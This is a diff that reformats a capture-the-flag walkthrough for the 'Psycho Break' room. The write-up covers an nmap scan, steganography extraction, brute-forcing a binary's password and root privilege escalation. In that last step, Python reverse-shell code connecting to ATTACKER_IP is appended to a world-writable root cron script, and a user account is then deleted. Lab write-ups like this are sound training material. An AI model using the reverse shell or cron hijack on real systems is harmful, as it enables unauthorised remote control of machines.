@@ -2,7 +2,7 @@
 # Psycho Break
 
 "This room is based on a video game called evil within". I see a load of steganograpy and 
-cryptography coming our way
+cryptography coming our way...
 
 ---
 
@@ -10,11 +10,11 @@ cryptography coming our way
 
 We'll start with our usual nmap scan
 
-    sudo nmap 10.10.242.66 -Pn -p- -A -vv -T4 -oN nmap-scan --script discovery,vuln --min-parallelism 60
+> `sudo nmap 10.10.242.66 -Pn -p- -A -vv -T4 -oN nmap-scan --script discovery,vuln --min-parallelism 60`    
 
 Select running services with this command:
 
-    cat nmap-scan | grep -e '[0-9]\+/tcp[[:space:]].*' -o
+> `cat nmap-scan | grep -e '[0-9]\+/tcp[[:space:]].*' -o`
 
 [x] 21/tcp open  ftp     syn-ack ttl 63 ProFTPD 1.3.5a
 
@@ -149,7 +149,7 @@ to translate audio to text. Playing the message a couple of times reveals the me
 
 For analysing emage we'll use steghide:
 
-    steghide --extract -sf Joseph_Oda.jpg
+> `steghide --extract -sf Joseph_Oda.jpg`
 
 Enter the morse-code message and you'll be presented with a thankyou.txt, which contains
 FTP credentials.
@@ -166,9 +166,11 @@ Via FTP we can download 2 files:
 I wasn't able to to find which password does this program use with static analysis, so
 let's try bruteforcing:
 
-    strings random.dic > random.txt
-    chmod +x program
-    while read line; do ./program "$line"; done < random.txt
+> `strings random.dic > random.txt`
+> 
+> `chmod +x program`
+> 
+> `while read line; do ./program "$line"; done < random.txt`
 
 And we now have a message to decode:
 
@@ -201,20 +203,21 @@ user.txt is right there, just `cat` it
 
 We'll start with a simple enumeration:
 
-    cat /etc/crontab
+> `cat /etc/crontab`
 
 - */2 * * * * root python3 /var/.the_eye_of_ruvik.py
 
 Let's take a look at the file
 
-    cd /var/
-    ls -la | grep eye
+> `cd /var/`
+>
+> `ls -la | grep eye`
 
 - -rwxr-xrw-  1 root root    300 Aug 14  2020 .the_eye_of_ruvik.py
 
 Ok, let's append python reverse shell there and wait for 2 minutes.
 
-```python
+```
 import socket,os,pty;
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
 s.connect(("ATTACKER_IP",8000));
@@ -230,4 +233,4 @@ That's it! Frankly, privilege escalation was the easiest part of this room.
 
 Just delete his account. In you root terminal:
 
-    userdel ruvik
+> `userdel ruvik`
